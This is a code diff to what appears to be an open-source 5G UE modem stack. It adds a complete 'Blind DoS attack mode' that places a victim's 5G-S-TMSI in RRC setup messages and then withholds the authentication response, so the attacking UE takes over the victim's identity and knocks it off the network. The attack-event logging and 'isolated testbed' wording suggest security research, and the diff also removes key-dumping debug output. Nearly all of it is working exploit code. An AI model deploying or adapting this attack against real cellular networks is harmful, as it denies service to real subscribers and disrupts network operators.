@@ -1,0 +1,577 @@
+diff --git a/executables/nr-uesoftmodem.c b/executables/nr-uesoftmodem.c
+index 4a9749e..b697a9a 100644
+--- a/executables/nr-uesoftmodem.c
++++ b/executables/nr-uesoftmodem.c
+@@ -4,11 +4,22 @@
+ 
+ 
+ #define _GNU_SOURCE             /* See feature_test_macros(7) */
++#include <ctype.h>
++#include <fcntl.h>
+ #include <sched.h>
+ #include <stdbool.h>
+ #include <signal.h>
+ #include <errno.h>
++#include <pthread.h>
++#include <stdarg.h>
++#include <stdatomic.h>
++#include <stdint.h>
++#include <stdio.h>
++#include <stdlib.h>
+ #include <string.h>
++#include <time.h>
++#include <sys/stat.h>
++#include <unistd.h>
+ 
+ #include "T.h"
+ #include "common/oai_version.h"
+@@ -132,11 +143,326 @@ uint64_t set_nrUE_optmask(uint64_t bitmask) {
+ nrUE_params_t *get_nrUE_params(void) {
+   return &nrUE_params;
+ }
++
++typedef enum {
++  BLIND_DISABLED,
++  BLIND_ARMED,
++  BLIND_MSG3_COMMITTED,
++  BLIND_MSG5_SUBMITTED,
++  BLIND_OBSERVING,
++} blind_state_t;
++
++typedef struct {
++  int enable;
++  int tun_suffix;
++  int target_wait_s;
++  char *target_text;
++  char *target_file;
++  char *run_id;
++  char *log_file;
++} blind_cfg_t;
++
++static blind_cfg_t blind_cfg;
++static uint64_t blind_target;
++static uint64_t blind_target_deadline_ns;
++static atomic_bool blind_target_ready;
++static atomic_bool blind_gate_terminal;
++static atomic_bool blind_ra_triggered;
++static atomic_int blind_state = BLIND_DISABLED;
++static unsigned blind_event_seq;
++static FILE *blind_log_fd;
++static pthread_mutex_t blind_log_mutex = PTHREAD_MUTEX_INITIALIZER;
++
++#define BLIND_PARAMS_DESC { \
++  {"enable", "1 = reuse one current 5G-S-TMSI in an isolated testbed\n", 0, .iptr=&blind_cfg.enable, .defintval=0, TYPE_INT, 0}, \
++  {"tun_suffix", "1 = include the PDU session ID in the UE TUN name\n", 0, .iptr=&blind_cfg.tun_suffix, .defintval=0, TYPE_INT, 0}, \
++  {"target_5g_s_tmsi", "exact 48-bit target as 0x followed by 12 hex digits\n", 0, .strptr=&blind_cfg.target_text, .defstrval=NULL, TYPE_STRING, 0}, \
++  {"target_file", "absolute path atomically created with the exact target when the one-shot may start\n", 0, .strptr=&blind_cfg.target_file, .defstrval=NULL, TYPE_STRING, 0}, \
++  {"target_wait_s", "finite target-file wait in seconds\n", 0, .iptr=&blind_cfg.target_wait_s, .defintval=120, TYPE_INT, 0}, \
++  {"run_id", "safe run identifier written to every event\n", 0, .strptr=&blind_cfg.run_id, .defstrval=NULL, TYPE_STRING, 0}, \
++  {"log_file", "new JSONL ground-truth file owned by the runner\n", 0, .strptr=&blind_cfg.log_file, .defstrval=NULL, TYPE_STRING, 0}, \
++}
++
++static uint64_t blind_now_ns(clockid_t clock_id)
++{
++  struct timespec ts;
++  clock_gettime(clock_id, &ts);
++  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
++}
++
++void nr_blind_log(int ue, const char *event, const char *fmt, ...)
++{
++  if (!blind_cfg.enable || !blind_log_fd)
++    return;
++  pthread_mutex_lock(&blind_log_mutex);
++  fprintf(blind_log_fd,
++          "{\"schema\":\"blind.attacker-event.v1\",\"run_id\":\"%s\",\"seq\":%u,"
++          "\"ue\":%d,\"realtime_ns\":%llu,\"monotonic_ns\":%llu,\"event\":\"%s\"",
++          blind_cfg.run_id,
++          ++blind_event_seq,
++          ue,
++          (unsigned long long)blind_now_ns(CLOCK_REALTIME),
++          (unsigned long long)blind_now_ns(CLOCK_MONOTONIC),
++          event);
++  if (fmt && fmt[0]) {
++    va_list ap;
++    va_start(ap, fmt);
++    fputc(',', blind_log_fd);
++    vfprintf(blind_log_fd, fmt, ap);
++    va_end(ap);
++  }
++  fputs("}\n", blind_log_fd);
++  fflush(blind_log_fd);
++  pthread_mutex_unlock(&blind_log_mutex);
++}
++
++static bool blind_safe_run_id(const char *value)
++{
++  if (!value || !value[0] || strlen(value) > 96)
++    return false;
++  for (const unsigned char *p = (const unsigned char *)value; *p; ++p)
++    if (!isalnum(*p) && *p != '.' && *p != '_' && *p != '-')
++      return false;
++  return true;
++}
++
++static uint64_t blind_parse_target(const char *value)
++{
++  AssertFatal(value && strlen(value) == 14 && value[0] == '0' && value[1] == 'x',
++              "--blind.target_5g_s_tmsi must be exactly 0x followed by 12 hex digits\n");
++  for (int i = 2; i < 14; ++i)
++    AssertFatal(isxdigit((unsigned char)value[i]),
++                "--blind.target_5g_s_tmsi must be exactly 0x followed by 12 hex digits\n");
++  errno = 0;
++  char *end = NULL;
++  unsigned long long parsed = strtoull(value + 2, &end, 16);
++  AssertFatal(errno == 0 && end && *end == '\0' && parsed <= 0xffffffffffffULL,
++              "--blind.target_5g_s_tmsi is outside the 48-bit range\n");
++  return (uint64_t)parsed;
++}
++
++static bool blind_load_target_file(int ue)
++{
++  if (atomic_load_explicit(&blind_target_ready, memory_order_acquire))
++    return true;
++  if (atomic_load_explicit(&blind_gate_terminal, memory_order_acquire) || oai_exit)
++    return false;
++  if (blind_now_ns(CLOCK_MONOTONIC) >= blind_target_deadline_ns) {
++    bool expected = false;
++    if (atomic_compare_exchange_strong_explicit(&blind_gate_terminal,
++                                                 &expected,
++                                                 true,
++                                                 memory_order_acq_rel,
++                                                 memory_order_acquire))
++      nr_blind_log(ue, "target_gate_failed", "\"reason\":\"timeout\"");
++    return false;
++  }
++
++  int fd = open(blind_cfg.target_file, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
++  if (fd < 0) {
++    if (errno != ENOENT) {
++      bool expected = false;
++      if (atomic_compare_exchange_strong_explicit(&blind_gate_terminal,
++                                                   &expected,
++                                                   true,
++                                                   memory_order_acq_rel,
++                                                   memory_order_acquire))
++        nr_blind_log(ue, "target_gate_failed", "\"reason\":\"open\",\"errno\":%d", errno);
++    }
++    return false;
++  }
++  struct stat st;
++  char value[64];
++  ssize_t length = read(fd, value, sizeof(value) - 1);
++  int saved_errno = errno;
++  bool regular = fstat(fd, &st) == 0 && S_ISREG(st.st_mode);
++  close(fd);
++  if (!regular || length <= 0 || length >= (ssize_t)sizeof(value) - 1) {
++    bool expected = false;
++    if (atomic_compare_exchange_strong_explicit(&blind_gate_terminal,
++                                                 &expected,
++                                                 true,
++                                                 memory_order_acq_rel,
++                                                 memory_order_acquire))
++      nr_blind_log(ue,
++                   "target_gate_failed",
++                   "\"reason\":\"invalid_file\",\"errno\":%d",
++                   length < 0 ? saved_errno : 0);
++    return false;
++  }
++  value[length] = '\0';
++  while (length > 0 && isspace((unsigned char)value[length - 1]))
++    value[--length] = '\0';
++  blind_target = blind_parse_target(value);
++  atomic_store_explicit(&blind_target_ready, true, memory_order_release);
++  nr_blind_log(ue,
++               "target_gate_opened",
++               "\"target_5g_s_tmsi\":\"0x%012llx\"",
++               (unsigned long long)blind_target);
++  return true;
++}
++
++static void nr_blind_config_init(configmodule_interface_t *cfg)
++{
++  paramdef_t params[] = BLIND_PARAMS_DESC;
++  config_get(cfg, params, sizeofArray(params), "blind");
++  AssertFatal(blind_cfg.enable == 0 || blind_cfg.enable == 1, "--blind.enable must be 0 or 1\n");
++  AssertFatal(blind_cfg.tun_suffix == 0 || blind_cfg.tun_suffix == 1,
++              "--blind.tun_suffix must be 0 or 1\n");
++  AssertFatal(blind_cfg.target_wait_s >= 1 && blind_cfg.target_wait_s <= 600,
++              "--blind.target_wait_s must be 1..600\n");
++  if (!blind_cfg.enable)
++    return;
++
++  AssertFatal(NB_UE_INST == 1, "Blind DoS attack mode requires --num-ues 1\n");
++  AssertFatal(blind_safe_run_id(blind_cfg.run_id),
++              "--blind.run_id must use 1..96 characters from [A-Za-z0-9._-]\n");
++  AssertFatal(blind_cfg.log_file && blind_cfg.log_file[0] == '/',
++              "--blind.log_file must be a non-empty absolute path\n");
++  const bool direct_target = blind_cfg.target_text && blind_cfg.target_text[0];
++  const bool gated_target = blind_cfg.target_file && blind_cfg.target_file[0];
++  AssertFatal(direct_target != gated_target,
++              "Blind attack mode requires exactly one of --blind.target_5g_s_tmsi or --blind.target_file\n");
++  if (gated_target) {
++    AssertFatal(blind_cfg.target_file[0] == '/', "--blind.target_file must be an absolute path\n");
++    blind_target_deadline_ns = blind_now_ns(CLOCK_MONOTONIC)
++                               + (uint64_t)blind_cfg.target_wait_s * 1000000000ULL;
++  }
++  if (direct_target) {
++    blind_target = blind_parse_target(blind_cfg.target_text);
++    atomic_store_explicit(&blind_target_ready, true, memory_order_release);
++  }
++  blind_log_fd = fopen(blind_cfg.log_file, "wx");
++  AssertFatal(blind_log_fd != NULL,
++              "Cannot create new --blind.log_file %s: %s\n",
++              blind_cfg.log_file,
++              strerror(errno));
++  setvbuf(blind_log_fd, NULL, _IOLBF, 0);
++  atomic_store_explicit(&blind_state, BLIND_ARMED, memory_order_release);
++  if (direct_target)
++    LOG_W(NR_RRC,
++          "[BLIND] one-shot reproducer armed for isolated testbed run_id=%s target=0x%012llx\n",
++          blind_cfg.run_id,
++          (unsigned long long)blind_target);
++  else
++    LOG_W(NR_RRC,
++          "[BLIND] one-shot reproducer armed for isolated testbed run_id=%s target=deferred\n",
++          blind_cfg.run_id);
++}
++
++bool nr_blind_use_pdu_suffix(void)
++{
++  return blind_cfg.tun_suffix == 1;
++}
++
++bool nr_blind_defer_initial_ra(void)
++{
++  return blind_cfg.enable && blind_cfg.target_file && blind_cfg.target_file[0];
++}
++
++bool nr_blind_take_target_gate(int ue)
++{
++  if (!nr_blind_defer_initial_ra() || !blind_load_target_file(ue))
++    return false;
++  AssertFatal(ue == 0, "Blind DoS attack mode supports UE instance 0 only\n");
++  bool expected = false;
++  return atomic_compare_exchange_strong_explicit(&blind_ra_triggered,
++                                                  &expected,
++                                                  true,
++                                                  memory_order_acq_rel,
++                                                  memory_order_acquire);
++}
++
++bool nr_blind_prepare_setup_request(int ue, bool actual_msg3, uint64_t *fiveg_s_tmsi)
++{
++  if (!blind_cfg.enable)
++    return true;
++  AssertFatal(ue == 0, "Blind DoS attack mode supports UE instance 0 only\n");
++  if (!atomic_load_explicit(&blind_target_ready, memory_order_acquire)
++      && !blind_load_target_file(ue))
++    return false;
++  if (!actual_msg3 && nr_blind_defer_initial_ra()
++      && atomic_load_explicit(&blind_ra_triggered, memory_order_acquire))
++    return false;
++  int state = atomic_load_explicit(&blind_state, memory_order_acquire);
++  if (state >= BLIND_MSG3_COMMITTED) {
++    nr_blind_log(ue,
++                 "retry_blocked",
++                 "\"source\":\"%s\",\"state\":%d",
++                 actual_msg3 ? "msg3_prepare" : "prebuild_or_t300",
++                 state);
++    return false;
++  }
++
++  *fiveg_s_tmsi = blind_target;
++  if (!actual_msg3)
++    return true;
++
++  int expected = BLIND_ARMED;
++  if (!atomic_compare_exchange_strong_explicit(&blind_state,
++                                                &expected,
++                                                BLIND_MSG3_COMMITTED,
++                                                memory_order_acq_rel,
++                                                memory_order_acquire)) {
++    nr_blind_log(ue, "retry_blocked", "\"source\":\"msg3_race\",\"state\":%d", expected);
++    return false;
++  }
++  const uint64_t part1 = blind_target & 0x7fffffffffULL;
++  const unsigned part2 = (unsigned)((blind_target >> 39) & 0x1ffU);
++  nr_blind_log(ue,
++               "target_msg3_committed",
++               "\"target_5g_s_tmsi\":\"0x%012llx\",\"part1\":%llu,\"part2\":%u,"
++               "\"claim\":\"payload_committed_not_air_confirmed\"",
++               (unsigned long long)blind_target,
++               (unsigned long long)part1,
++               part2);
++  return true;
++}
++
++bool nr_blind_attempt_active(int ue)
++{
++  return blind_cfg.enable && ue == 0
++         && atomic_load_explicit(&blind_state, memory_order_acquire) >= BLIND_MSG3_COMMITTED;
++}
++
++void nr_blind_note_setup_complete(int ue)
++{
++  if (!nr_blind_attempt_active(ue))
++    return;
++  int expected = BLIND_MSG3_COMMITTED;
++  if (atomic_compare_exchange_strong_explicit(&blind_state,
++                                               &expected,
++                                               BLIND_MSG5_SUBMITTED,
++                                               memory_order_acq_rel,
++                                               memory_order_acquire))
++    nr_blind_log(ue, "rrc_setup_complete_submitted", "\"identity_encoding\":\"part2\"");
++}
++
++bool nr_blind_withhold_auth(int ue)
++{
++  if (!nr_blind_attempt_active(ue))
++    return false;
++  int state = atomic_load_explicit(&blind_state, memory_order_acquire);
++  bool repeated = state == BLIND_OBSERVING;
++  while (state < BLIND_OBSERVING
++         && !atomic_compare_exchange_weak_explicit(&blind_state,
++                                                    &state,
++                                                    BLIND_OBSERVING,
++                                                    memory_order_acq_rel,
++                                                    memory_order_acquire)) {}
++  nr_blind_log(ue,
++               "authentication_request_withheld",
++               "\"response_submitted\":false,\"retransmission\":%s",
++               repeated ? "true" : "false");
++  return true;
++}
++
+ static void get_options(configmodule_interface_t *cfg)
+ {
+   paramdef_t cmdline_params[] = CMDLINE_NRUEPARAMS_DESC;
+   int numparams = sizeofArray(cmdline_params);
+   config_get(cfg, cmdline_params, numparams, NULL);
++  nr_blind_config_init(cfg);
+   AssertFatal(nrUE_params.extra_pdu_id == -1,
+               "Add additional PDU sessions in uicc.pdu_sessions array instead\n");
+ }
+diff --git a/executables/nr-uesoftmodem.h b/executables/nr-uesoftmodem.h
+index 43e4f52..4b7e8c0 100644
+--- a/executables/nr-uesoftmodem.h
++++ b/executables/nr-uesoftmodem.h
+@@ -134,6 +134,15 @@ extern uint64_t get_nrUE_optmask(void);
+ extern uint64_t set_nrUE_optmask(uint64_t bitmask);
+ extern nrUE_params_t *get_nrUE_params(void);
+ 
++bool nr_blind_use_pdu_suffix(void);
++bool nr_blind_defer_initial_ra(void);
++bool nr_blind_take_target_gate(int ue);
++bool nr_blind_prepare_setup_request(int ue, bool actual_msg3, uint64_t *fiveg_s_tmsi);
++bool nr_blind_attempt_active(int ue);
++void nr_blind_note_setup_complete(int ue);
++bool nr_blind_withhold_auth(int ue);
++void nr_blind_log(int ue, const char *event, const char *fmt, ...) __attribute__((format(printf, 3, 4)));
++
+ // In nr-ue.c
+ extern void fill_ue_band_info(void);
+ extern void init_NR_UE(int, char *, char *, char *, int);
+diff --git a/openair2/RRC/NR_UE/rrc_UE.c b/openair2/RRC/NR_UE/rrc_UE.c
+index 7858a82..2a1dd48 100644
+--- a/openair2/RRC/NR_UE/rrc_UE.c
++++ b/openair2/RRC/NR_UE/rrc_UE.c
+@@ -371,8 +371,10 @@ static void nr_decode_SI(NR_UE_RRC_SI_INFO *SI_info, NR_SystemInformation_t *si,
+   }
+ }
+ 
+-static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc)
++static bool nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc, bool actual_msg3)
+ {
++  if (!nr_blind_prepare_setup_request(rrc->ue_id, actual_msg3, &rrc->fiveG_S_TMSI))
++    return false;
+   RRCLOG_D("Generation of RRCSetupRequest\n");
+   uint8_t rv[6];
+   // Get RRCConnectionRequest, fill random for now
+@@ -390,6 +392,7 @@ static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc)
+   int len = do_RRCSetupRequest(buf, sizeof(buf), rv, rrc->fiveG_S_TMSI);
+ 
+   nr_rlc_srb_recv_sdu(rrc->ue_id, 0, buf, len);
++  return true;
+ }
+ 
+ static void nr_rrc_configure_default_SI(NR_UE_RRC_SI_INFO *SI_info,
+@@ -533,7 +536,7 @@ static void nr_rrc_process_sib1(NR_UE_RRC_INST_t *rrc, NR_UE_RRC_SI_INFO *SI_inf
+   rrc_msg.payload_type = NR_MAC_RRC_CONFIG_SIB1;
+   nr_mac_rrc_config_sib1_t *config_sib1 = &rrc_msg.payload.config_sib1;
+   config_sib1->sib1 = sib1;
+-  config_sib1->can_start_ra = !rrc->is_NTN_UE;
++  config_sib1->can_start_ra = !rrc->is_NTN_UE && !nr_blind_defer_initial_ra();
+   nr_rrc_send_msg_to_mac(rrc, &rrc_msg);
+ }
+ 
+@@ -2122,7 +2125,7 @@ static void nr_rrc_prepare_msg3_payload(NR_UE_RRC_INST_t *rrc)
+   switch (rrc->ra_trigger) {
+     case RRC_CONNECTION_SETUP:
+       // preparing RRC setup request payload in advance
+-      nr_rrc_ue_prepare_RRCSetupRequest(rrc);
++      nr_rrc_ue_prepare_RRCSetupRequest(rrc, true);
+       break;
+     case RRC_CONNECTION_REESTABLISHMENT:
+       // preparing MSG3 for re-establishment in advance
+@@ -2286,7 +2289,7 @@ static void rrc_ue_generate_RRCSetupComplete(NR_UE_RRC_INST_t *rrc, const uint8_
+                                  sizeof(buffer),
+                                  Transaction_id,
+                                  rrc->selected_plmn_identity,
+-                                 rrc->ra_trigger == RRC_CONNECTION_SETUP,
++                                 nr_blind_attempt_active(rrc->ue_id) || rrc->ra_trigger == RRC_CONNECTION_SETUP,
+                                  rrc->fiveG_S_TMSI,
+                                  (const uint32_t)initialNasMsg.length,
+                                  (const char*)initialNasMsg.nas_data);
+@@ -2298,6 +2301,7 @@ static void rrc_ue_generate_RRCSetupComplete(NR_UE_RRC_INST_t *rrc, const uint8_
+   int srb_id = 1; // RRC setup complete on SRB1
+   RRCLOG_D("PDCP_DATA_REQ/%d Bytes RRCSetupComplete ---> %d\n", size, srb_id);
+   nr_pdcp_data_req_srb(rrc->ue_id, srb_id, 0, size, buffer, deliver_pdu_srb_rlc, NULL);
++  nr_blind_note_setup_complete(rrc->ue_id);
+ }
+ 
+ static void nr_rrc_rrcsetup_fallback(NR_UE_RRC_INST_t *rrc)
+@@ -2561,8 +2565,6 @@ static void nr_rrc_ue_process_securityModeCommand(NR_UE_RRC_INST_t *rrc,
+   nr_derive_key(RRC_ENC_ALG, rrc->cipheringAlgorithm, rrc->kgnb, security_parameters.ciphering_key);
+   nr_derive_key(RRC_INT_ALG, rrc->integrityProtAlgorithm, rrc->kgnb, security_parameters.integrity_key);
+ 
+-  log_dump(NR_RRC, rrc->kgnb, 32, LOG_DUMP_CHAR, "deriving kRRCenc, kRRCint from KgNB=");
+-
+   /* for SecurityModeComplete, ciphering is not activated yet, only integrity */
+   security_parameters.ciphering_algorithm = 0;
+   security_parameters.integrity_algorithm = rrc->integrityProtAlgorithm;
+@@ -3316,6 +3318,11 @@ void *rrc_nrue(void *notUsed)
+     nr_rrc_handle_timers(rrc);
+     NR_UE_RRC_SI_INFO *SInfo = &rrc->perNB[NRRRC_FRAME_PROCESS(msg_p).gnb_id].SInfo;
+     nr_rrc_SI_timers(SInfo);
++    if (SInfo->sib1_validity && rrc->nrRrcState == RRC_STATE_IDLE_NR
++        && nr_blind_take_target_gate(rrc->ue_id)) {
++      rrc->ra_trigger = RRC_CONNECTION_SETUP;
++      nr_rrc_trigger_mac_ra(rrc, NR_MAC_RA_START_SETUP);
++    }
+     if (rrc->process_target_ntncfg) {
+       // Process target NTNCFG as the target cells timing is acquired
+       nr_rrc_process_ntnconfig(rrc, &rrc->perNB[NRRRC_FRAME_PROCESS(msg_p).gnb_id].SInfo, rrc->target_ntncfg, rrc->current_frame, true);
+@@ -3448,9 +3455,10 @@ void *rrc_nrue(void *notUsed)
+       if (rrc->nrRrcState == RRC_STATE_IDLE_NR) {
+         RA_trigger_t prev_trigger = rrc->ra_trigger;
+         rrc->ra_trigger = RRC_CONNECTION_SETUP;
+-        nr_rrc_ue_prepare_RRCSetupRequest(rrc);
+-        nr_rrc_trigger_mac_ra(rrc, NR_MAC_RA_START_SETUP);
+-        RRCLOG_I("Triggering MAC RA for RRCSetupComplete pending NAS (prev_trigger=%d)\n", prev_trigger);
++        if (nr_rrc_ue_prepare_RRCSetupRequest(rrc, false)) {
++          nr_rrc_trigger_mac_ra(rrc, NR_MAC_RA_START_SETUP);
++          RRCLOG_I("Triggering MAC RA for RRCSetupComplete pending NAS (prev_trigger=%d)\n", prev_trigger);
++        }
+       }
+       break;
+     }
+@@ -3778,9 +3786,8 @@ void handle_302_expired_stopped(NR_UE_RRC_INST_t *rrc)
+ void handle_t300_expiry(NR_UE_RRC_INST_t *rrc)
+ {
+   rrc->ra_trigger = RRC_CONNECTION_SETUP;
+-  nr_rrc_ue_prepare_RRCSetupRequest(rrc);
+-
+-  nr_rrc_trigger_mac_ra(rrc, NR_MAC_RA_START_T300);
++  if (nr_rrc_ue_prepare_RRCSetupRequest(rrc, false))
++    nr_rrc_trigger_mac_ra(rrc, NR_MAC_RA_START_T300);
+ 
+   // TODO handle connEstFailureControl
+   // TODO inform upper layers about the failure to establish the RRC connection
+diff --git a/openair3/NAS/NR_UE/nr_nas_msg.c b/openair3/NAS/NR_UE/nr_nas_msg.c
+index 7ef3cbe..af9224f 100644
+--- a/openair3/NAS/NR_UE/nr_nas_msg.c
++++ b/openair3/NAS/NR_UE/nr_nas_msg.c
+@@ -790,25 +790,6 @@ static void derive_ue_keys(uint8_t *buf, nr_ue_nas_t *nas)
+   derive_kseaf(kausf, kseaf, nas->sn_id);
+   derive_kamf(kseaf, kamf, 0x0000, nas->uicc);
+   derive_kgnb(kamf, nas->security.nas_count_ul, kgnb);
+-
+-  printf("kausf:");
+-  for (int i = 0; i < 32; i++) {
+-    printf("%x ", kausf[i]);
+-  }
+-  printf("\n");
+-
+-  printf("kseaf:");
+-  for (int i = 0; i < 32; i++) {
+-    printf("%x ", kseaf[i]);
+-  }
+-
+-  printf("\n");
+-
+-  printf("kamf:");
+-  for (int i = 0; i < 32; i++) {
+-    printf("%x ", kamf[i]);
+-  }
+-  printf("\n");
+ }
+ 
+ nr_ue_nas_t *get_ue_nas_info(module_id_t module_id)
+@@ -1505,18 +1486,6 @@ static void handle_security_mode_command(nr_ue_nas_t *nas, as_nas_info_t *initia
+   derive_knas(0x01, ciphering_algorithm, kamf, knas_enc);
+   derive_knas(0x02, integrity_algorithm, kamf, knas_int);
+ 
+-  printf("knas_int: ");
+-  for (int i = 0; i < 16; i++) {
+-    printf("%x ", knas_int[i]);
+-  }
+-  printf("\n");
+-
+-  printf("knas_enc: ");
+-  for (int i = 0; i < 16; i++) {
+-    printf("%x ", knas_enc[i]);
+-  }
+-  printf("\n");
+-
+   if (integrity_algorithm != EIA0_ALG_ID) {
+     nas->security_container = stream_security_container_init(ciphering_algorithm, integrity_algorithm, knas_enc, knas_int);
+   } else {
+@@ -1761,7 +1730,7 @@ static void handle_pdu_session_accept(const nr_ue_nas_t *nas, uint8_t *pdu_buffe
+   set_qfi(msg.qos_rules.rule->qfi, sm_header.pdu_session_id, instance);
+ 
+   // process PDU Session: pass ID -1 to not append PDU ID to interface
+-  bool is_default = idx == 0;
++  bool is_default = idx == 0 && !nr_blind_use_pdu_suffix();
+   if (msg.pdu_type == PDU_SESSION_TYPE_ETHER) {
+     create_ue_eth_if(instance, sm_header.pdu_session_id, is_default);
+   } else if (msg.pdu_addr_ie.pdu_length) {
+@@ -2472,7 +2441,8 @@ void *nas_nrue(void *args_p)
+             handle_identity_request(&initialNasMsg, nas, buffer);
+             break;
+           case FGS_AUTHENTICATION_REQUEST:
+-            handle_fgmm_authentication_request(nas, &initialNasMsg, &buffer);
++            if (!nr_blind_withhold_auth(nas->UE_id))
++              handle_fgmm_authentication_request(nas, &initialNasMsg, &buffer);
+             break;
+           case FGS_AUTHENTICATION_REJECT:
+             handle_authentication_reject(nas, pdu_buffer, pdu_length);
+diff --git a/openair3/UICC/usim_interface.c b/openair3/UICC/usim_interface.c
+index 9ec066b..c0463f1 100644
+--- a/openair3/UICC/usim_interface.c
++++ b/openair3/UICC/usim_interface.c
+@@ -62,7 +62,7 @@ uicc_t *init_uicc(char *sectionName) {
+   // key, OPc, sqn, amf don't need to be read from the true USIM
+   int ret = config_get(config_get_if(), uicc_params, sizeofArray(uicc_params), sectionName);
+   AssertFatal(ret >= 0, "configuration couldn't be performed for uicc name: %s", sectionName);
+-  LOG_I(SIM, "UICC simulation: IMSI=%s, IMEISV=%s, Ki=%s, OPc=%s\n", uicc->imsiStr, uicc->imeisvStr, uicc->keyStr, uicc->opcStr);
++  LOG_I(SIM, "UICC simulation configured\n");
+   to_hex(uicc->keyStr,uicc->key, sizeof(uicc->key) );
+   to_hex(uicc->opcStr,uicc->opc, sizeof(uicc->opc) );
+   to_hex(uicc->sqnStr,uicc->sqn, sizeof(uicc->sqn) );
+@@ -76,15 +76,6 @@ void uicc_milenage_generate(uint8_t *autn, uicc_t *uicc) {
+   // the code is in open-cells.com => program_uicc open source
+   milenage_generate(uicc->opc, uicc->amf, uicc->key,
+                     uicc->sqn, uicc->rand, autn, uicc->ik, uicc->ck, uicc->milenage_res);
+-  log_dump(SIM,uicc->opc,sizeof(uicc->opc), LOG_DUMP_CHAR,"opc:");
+-  log_dump(SIM,uicc->amf,sizeof(uicc->amf), LOG_DUMP_CHAR,"amf:");
+-  log_dump(SIM,uicc->key,sizeof(uicc->key), LOG_DUMP_CHAR,"key:");
+-  log_dump(SIM,uicc->sqn,sizeof(uicc->sqn), LOG_DUMP_CHAR,"sqn:");
+-  log_dump(SIM,uicc->rand,sizeof(uicc->rand), LOG_DUMP_CHAR,"rand:");
+-  log_dump(SIM,uicc->ik,sizeof(uicc->ik), LOG_DUMP_CHAR,"milenage output ik:");
+-  log_dump(SIM,uicc->ck,sizeof(uicc->ck), LOG_DUMP_CHAR,"milenage output ck:");
+-  log_dump(SIM,uicc->milenage_res,sizeof(uicc->milenage_res), LOG_DUMP_CHAR,"milenage output res:");
+-  log_dump(SIM,autn,sizeof(autn), LOG_DUMP_CHAR,"milenage output autn:");
+ }
+ 
+ uicc_t * checkUicc(int Mod_id) {
